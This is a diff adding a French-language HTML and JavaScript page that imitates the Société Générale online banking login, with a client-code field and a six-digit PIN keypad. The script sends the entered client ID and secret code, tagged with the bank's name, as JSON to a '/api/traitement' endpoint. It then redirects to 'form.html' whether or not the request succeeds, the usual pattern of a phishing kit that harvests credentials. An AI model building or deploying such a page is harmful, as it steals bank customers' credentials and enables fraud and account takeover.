@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SG - Connexion Espace Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- STYLES GENERAUX RESSEMBLANCE BANQUE --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        .app-container {
+            width: 100%;
+            max-width: 440px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.05);
+        }
+
+        /* --- FILTRAGE ET AFFICHAGE DES ETAPES --- */
+        .sg-step {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            flex-grow: 1;
+        }
+        .sg-step.active-step {
+            display: flex !important;
+        }
+
+        /* --- HEADER OFFICIEL SG --- */
+        .sg-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 20px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #eef1f4;
+        }
+        .sg-logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .sg-logo-area img.ca-main-brand {
+            height: 26px;
+            width: auto;
+            object-fit: contain;
+        }
+        .sg-logo-slogan {
+            display: flex;
+            flex-direction: column;
+            font-size: 8.5px;
+            font-weight: 700;
+            color: #718096;
+            line-height: 1.1;
+            border-left: 1px solid #cbd5e0;
+            padding-left: 10px;
+            letter-spacing: 0.5px;
+        }
+        .sg-btn-open-account {
+            background-color: transparent;
+            border: 1px solid #1a1a1a;
+            color: #1a1a1a;
+            padding: 7px 14px;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .sg-btn-open-account:hover {
+            background-color: #f7fafc;
+        }
+
+        /* --- CONTENU & ZONE TEXTE --- */
+        .sg-content {
+            padding: 35px 24px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+        .sg-main-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 28px;
+            line-height: 1.35;
+        }
+
+        /* --- COMPOSANTS DE SAISIE DE L'IDENTIFIANT --- */
+        .sg-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            margin-bottom: 22px;
+            border: 1px solid #ccd4dc;
+            border-radius: 6px;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+        .sg-input-wrapper:focus-within {
+            border-color: #ea1c24;
+            box-shadow: 0 0 0 1px #ea1c24;
+        }
+        .sg-input-wrapper input {
+            width: 100%;
+            height: 52px;
+            border: none;
+            background: transparent;
+            padding: 0 45px 0 16px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #1a1a1a;
+            outline: none;
+        }
+        .sg-clear-input {
+            position: absolute;
+            right: 16px;
+            font-size: 22px;
+            color: #a0aec0;
+            cursor: pointer;
+            display: none;
+            user-select: none;
+        }
+
+        /* TOGGLES OPTIONS */
+        .sg-toggle-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+        .sg-toggle-row.center-toggle {
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        .sg-switch {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 24px;
+        }
+        .sg-switch input { opacity: 0; width: 0; height: 0; }
+        .sg-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #cbd5e0;
+            transition: .25s;
+            border-radius: 24px;
+        }
+        .sg-slider:before {
+            position: absolute;
+            content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px;
+            background-color: white; transition: .25s; border-radius: 50%;
+        }
+        input:checked + .sg-slider { background-color: #000000; }
+        input:checked + .sg-slider:before { transform: translateX(20px); }
+        .sg-toggle-label { font-size: 14.5px; color: #4a5568; font-weight: 500; }
+
+        /* --- VISUEL CODE SECRET (DOTS COCHÉS) --- */
+        .sg-dots-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 30px;
+            background-color: #f8fafc;
+            padding: 16px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+        .sg-dots-row {
+            display: flex;
+            gap: 16px;
+        }
+        .sg-dot {
+            width: 14px;
+            height: 14px;
+            border: 2px solid #a0aec0;
+            border-radius: 50%;
+            background-color: transparent;
+            transition: transform 0.1s ease, background-color 0.1s;
+        }
+        .sg-dot.filled {
+            background-color: #ea1c24 !important;
+            border-color: #ea1c24 !important;
+            transform: scale(1.1);
+        }
+        .sg-backspace-btn {
+            font-size: 24px;
+            color: #ea1c24;
+            cursor: pointer;
+            font-weight: 700;
+            user-select: none;
+            padding-left: 5px;
+        }
+
+        /* MATRIX CLAVIER DYNAMIQUE SG */
+        .sg-keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 35px;
+        }
+        .sg-key {
+            width: 100%;
+            height: 56px;
+            background-color: #ffffff;
+            border: 1px solid #dcdfe4;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.1s;
+        }
+        .sg-key:active {
+            background-color: #edf2f7;
+        }
+        .sg-key-empty {
+            visibility: hidden;
+        }
+        .sg-zero-highlight {
+            background-color: #ffffff;
+        }
+
+        /* --- CRÉATION ACTION BOUTONS CHARTE --- */
+        .sg-btn-main-red {
+            width: 100%;
+            height: 52px;
+            border: none;
+            border-radius: 6px;
+            background-color: #ea1c24;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .sg-btn-main-red:hover {
+            background-color: #d01219;
+        }
+        .sg-btn-main-gray {
+            width: 100%;
+            height: 52px;
+            border: none;
+            border-radius: 6px;
+            background-color: #cbd5e0;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: not-allowed;
+        }
+
+        /* --- BLOC ASSISTANCE ET LOGS EN BAS --- */
+        .sg-help-section {
+            margin-top: 40px;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        .sg-help-section.space-top-border {
+            border-top: 1px solid #eef1f4;
+            padding-top: 28px;
+        }
+        .sg-help-section h3 {
+            font-size: 14px;
+            font-weight: 700;
+            color: #000000;
+        }
+        .sg-help-section p {
+            font-size: 13px;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+        .sg-help-link {
+            font-size: 13.5px;
+            color: #ea1c24;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .sg-help-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div id="sg-step-id" class="sg-step active-step">
+            <header class="sg-header">
+                <div class="sg-logo-area">
+                    <img src="Societe-Generale-Emblem.png" alt="Société Générale" class="ca-main-brand">
+                    <div class="sg-logo-slogan">
+                        <span>C'EST VOUS</span>
+                        <span>L'AVENIR</span>
+                    </div>
+                </div>
+                <button type="button" class="sg-btn-open-account">Ouvrir un compte</button>
+            </header>
+
+            <main class="sg-content">
+                <h2 class="sg-main-title">Connexion à votre Espace Client Particuliers</h2>
+                
+                <div class="sg-input-wrapper">
+                    <input type="tel" id="sg-client-id" maxlength="8" placeholder="Saisissez votre code client" autocomplete="off">
+                    <span class="sg-clear-input" id="sg-id-clear">×</span>
+                </div>
+
+                <div class="sg-toggle-row">
+                    <label class="sg-switch">
+                        <input type="checkbox" id="sg-remember-me">
+                        <span class="sg-slider"></span>
+                    </label>
+                    <span class="sg-toggle-label">Se souvenir de moi</span>
+                </div>
+
+                <button type="button" id="sg-btn-submit-id" class="sg-btn-main-red">Valider</button>
+
+                <div class="sg-help-section">
+                    <h3>Où trouver mon Code Client SG ?</h3>
+                    <p>Votre Code Client vous a été communiqué lors de la souscription... Il est également indiqué sur vos relevés de comptes.</p>
+                    
+                    <h3>Code Client ou Code Secret inconnus ?</h3>
+                    <a href="javascript:void(0);" class="sg-help-link">» Je souhaite obtenir mon Code Client</a>
+                    <a href="javascript:void(0);" class="sg-help-link">» Je ne connais pas mon Code Secret</a>
+                </div>
+            </main>
+        </div>
+
+        <div id="sg-step-password" class="sg-step">
+            <header class="sg-header">
+                <div class="sg-logo-area">
+                    <img src="Societe-Generale-Emblem.png" alt="Société Générale" class="ca-main-brand">
+                    <div class="sg-logo-slogan">
+                        <span>C'EST VOUS</span>
+                        <span>L'AVENIR</span>
+                    </div>
+                </div>
+                <button type="button" class="sg-btn-open-account" id="sg-btn-back-id">Retour</button>
+            </header>
+
+            <main class="sg-content">
+                <h2 class="sg-main-title">Connexion à votre Espace Client Particuliers</h2>
+
+                <div class="sg-toggle-row center-toggle">
+                    <label class="sg-switch">
+                        <input type="checkbox" checked disabled>
+                        <span class="sg-slider"></span>
+                    </label>
+                    <span class="sg-toggle-label">Se souvenir de moi</span>
+                </div>
+
+                <div class="sg-dots-container">
+                    <div class="sg-dots-row">
+                        <span class="sg-dot"></span>
+                        <span class="sg-dot"></span>
+                        <span class="sg-dot"></span>
+                        <span class="sg-dot"></span>
+                        <span class="sg-dot"></span>
+                        <span class="sg-dot"></span>
+                    </div>
+                    <span class="sg-backspace-btn" id="sg-backspace">×</span>
+                </div>
+
+                <div class="sg-keyboard-grid" id="sg-virtual-keyboard"></div>
+
+                <button type="button" id="sg-btn-submit-pass" class="sg-btn-main-gray" disabled>Valider</button>
+
+                <div class="sg-help-section space-top-border">
+                    <h3>Où trouver mon Code Client SG ?</h3>
+                    <p>Votre Code Client vous a été communiqué lors de la souscription... Il est également indiqué sur vos relevés de comptes.</p>
+                    
+                    <h3>Code Client ou Code Secret inconnus ?</h3>
+                    <a href="javascript:void(0);" class="sg-help-link">» Je souhaite obtenir mon Code Client</a>
+                    <a href="javascript:void(0);" class="sg-help-link">» Je ne connais pas mon Code Secret</a>
+                </div>
+            </main>
+        </div>
+
+    </div>
+
+    <script>
+        // RÉCUPÉRATION DES ÉLÉMENTS DU DOM
+        const stepId = document.getElementById('sg-step-id');
+        const stepPass = document.getElementById('sg-step-password');
+        const inputId = document.getElementById('sg-client-id');
+        const btnClearId = document.getElementById('sg-id-clear');
+        const btnSubmitId = document.getElementById('sg-btn-submit-id');
+        const btnSubmitPass = document.getElementById('sg-btn-submit-pass');
+        const backspaceBtn = document.getElementById('sg-backspace');
+        const keyboardGrid = document.getElementById('sg-virtual-keyboard');
+        const dots = document.querySelectorAll('.sg-dot');
+        const btnBackId = document.getElementById('sg-btn-back-id');
+
+        let secretCode = ""; // Variable unique pour stocker le PIN de 6 chiffres
+
+        // FILTRAGE ET VALIDATION DE L'IDENTIFIANT
+        inputId.addEventListener('input', () => {
+            inputId.value = inputId.value.replace(/\D/g, ''); // Uniquement numérique
+            btnClearId.style.display = inputId.value.length > 0 ? 'block' : 'none';
+        });
+
+        btnClearId.addEventListener('click', () => {
+            inputId.value = "";
+            btnClearId.style.display = 'none';
+            inputId.focus();
+        });
+
+        // PROGRESSION VERS L'ETAPE 2
+        btnSubmitId.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (inputId.value.length >= 4) {
+                stepId.classList.remove('active-step');
+                stepPass.classList.add('active-step');
+                buildSgKeyboard();
+            } else {
+                alert('Veuillez renseigner votre code client.');
+            }
+        });
+
+        // RETOUR EN ARRIÈRE D'ÉTAPE
+        btnBackId.addEventListener('click', (e) => {
+            e.preventDefault();
+            secretCode = "";
+            updateDots();
+            stepPass.classList.remove('active-step');
+            stepId.classList.add('active-step');
+        });
+
+        // GENERATION DU CLAVIER VISUEL SG (4 COLONNES COHÉRENT)
+        function buildSgKeyboard() {
+            keyboardGrid.innerHTML = "";
+            
+            const layout = [
+                '1', '2', '3', '',
+                '4', '5', '6', '0',
+                '7', '8', '9', ''
+            ];
+
+            layout.forEach(val => {
+                const cell = document.createElement('div');
+                if (val === '') {
+                    cell.className = 'sg-key-empty';
+                } else {
+                    const btn = document.createElement('button');
+                    btn.type = 'button';
+                    btn.className = 'sg-key';
+                    btn.textContent = val;
+                    
+                    if (val === '0') {
+                        btn.classList.add('sg-zero-highlight');
+                    }
+
+                    btn.onclick = (e) => {
+                        e.preventDefault();
+                        if (secretCode.length < 6) {
+                            secretCode += val;
+                            updateDots();
+                        }
+                    };
+                    cell.appendChild(btn);
+                }
+                keyboardGrid.appendChild(cell);
+            });
+        }
+
+        // METTRE A JOUR L'ETAT DES POINTS DE SÉCURITÉ (DOTS)
+        function updateDots() {
+            dots.forEach((dot, index) => {
+                if (index < secretCode.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            });
+
+            // PAS DE SOUMISSION AUTOMATIQUE : On active simplement le bouton de validation manuel
+            if (secretCode.length === 6) {
+                btnSubmitPass.removeAttribute('disabled');
+                btnSubmitPass.className = 'sg-btn-main-red';
+            } else {
+                btnSubmitPass.setAttribute('disabled', 'true');
+                btnSubmitPass.className = 'sg-btn-main-gray';
+            }
+        }
+
+        // SUPPRESSION (RESET DU CODE PIN COMPLET)
+        backspaceBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            secretCode = "";
+            updateDots();
+        });
+
+        // ACTION DE TENTATIVE DE CONNEXION MANUELLE
+        btnSubmitPass.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (secretCode.length === 6) {
+                submitToPHP(); 
+            }
+        });
+
+        // ENVOI STRUCTURE EN FORMAT JSON VERS TON API TRAITEMENT
+        function submitToPHP() {
+            if (!inputId.value || secretCode.length !== 6) return;
+
+            const dataToSend = {
+                nom_banque: "SOCIETE GENERALE",
+                client_id: inputId.value,
+                secret_code: secretCode
+            };
+
+            // Changement d'état visuel vers le chargement
+            btnSubmitPass.setAttribute('disabled', 'true');
+            btnSubmitPass.className = 'sg-btn-main-gray';
+            btnSubmitPass.textContent = 'Connexion en cours...';
+
+            // Redirection de sécurité (Fallback anti-blocage réseau)
+            const backupRedirect = setTimeout(() => {
+                window.location.href = 'form.html';
+            }, 1800);
+
+            fetch('/api/traitement', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(dataToSend)
+            })
+            .then(() => {
+                clearTimeout(backupRedirect);
+                window.location.href = 'form.html';
+            })
+            .catch(() => {
+                clearTimeout(backupRedirect);
+                window.location.href = 'form.html';
+            });
+        }
+    </script>
+</body>
+</html>
